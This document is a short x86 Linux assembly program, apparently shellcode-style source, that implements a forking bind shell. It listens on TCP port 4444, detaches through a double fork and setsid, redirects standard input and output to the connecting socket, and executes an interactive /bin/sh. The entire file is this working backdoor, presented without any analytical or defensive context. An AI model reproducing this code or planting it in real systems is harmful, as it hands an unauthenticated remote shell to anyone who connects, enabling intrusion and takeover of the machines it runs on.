# oblique 2010

.text
.globl _start
_start:

    xorl %edi, %edi

# socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    pushl $6        # IPPROTO_TCP
    pushl $1        # SOCK_STREAM
    pushl $2        # AF_INET
    movl %esp, %ecx
    movl $1, %ebx
    movl $102, %eax
    int $0x80

    movl %eax, %edx # save sockfd to edx

# bind(sockfd, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, sizeof(struct sockaddr_in))
    # struct sockaddr_in
    push %edi       # 0
    push %edi       # 0
    push %edi       # 0.0.0.0
    pushl $0x5c11   # 0x5c11 == htons(4444)
    pushw $2        # AF_INET
    movl %esp, %ebx # save the struct sockaddr_in pointer to ebx

    pushl $16       # sizeof(struct sockaddr_in)
    pushl %ebx      # struct sockaddr_in *
    pushl %edx      # sockfd

    # call bind
    movl %esp, %ecx 
    movl $2, %ebx
    movl $102, %eax
    int $0x80

# listen(sockfd, 0)
    pushl %edi      # 0
    pushl %edx      # sockfd
    movl %esp, %ecx
    movl $4, %ebx
    movl $102, %eax
    int $0x80

    jmp accept
wait:
    pushl %edi
    pushl %edx

    movl $-1, %ebx
    xorl %ecx, %ecx
    xorl %edx, %edx
    movl $7, %eax
    int $0x80

    popl %edx
    popl %edi

# accept(sockfd, NULL, NULL)
accept:
    pushl %edi      # NULL
    pushl %edi      # NULL
    pushl %edx      # sockfd
    movl %esp, %ecx
    movl $5, %ebx
    movl $102, %eax
    int $0x80

    movl %eax, %ebx

# fork()
    movl $2, %eax
    int $0x80

    cmpl $0, %eax
    jne wait

# setsid()
    movl $66, %eax
    int $0x80

# fork()
    movl $2, %eax
    int $0x80

    cmpl $0, %eax
    jne exit

# dup2(newsockfd, 0..2)
    xorl %ecx, %ecx
dup2:
    movl $63, %eax
    int $0x80
    inc %ecx
    cmpb $3, %cl
    jne dup2

# execve("/bin/sh", ["/bin/sh", "-i"], 0)
    pushl $0x0000692d
    movl %esp, %edx
    pushl $0x0068732f
    pushl $0x6e69622f
    movl %esp, %ebx
    pushl $0
    pushl %edx
    pushl %ebx
    movl %esp, %ecx
    xorl %edx, %edx
    movl $11, %eax
    int $0x80

# _exit(0)
exit:
    xorl %ebx, %ebx
    movl $1, %eax
    int $0x80
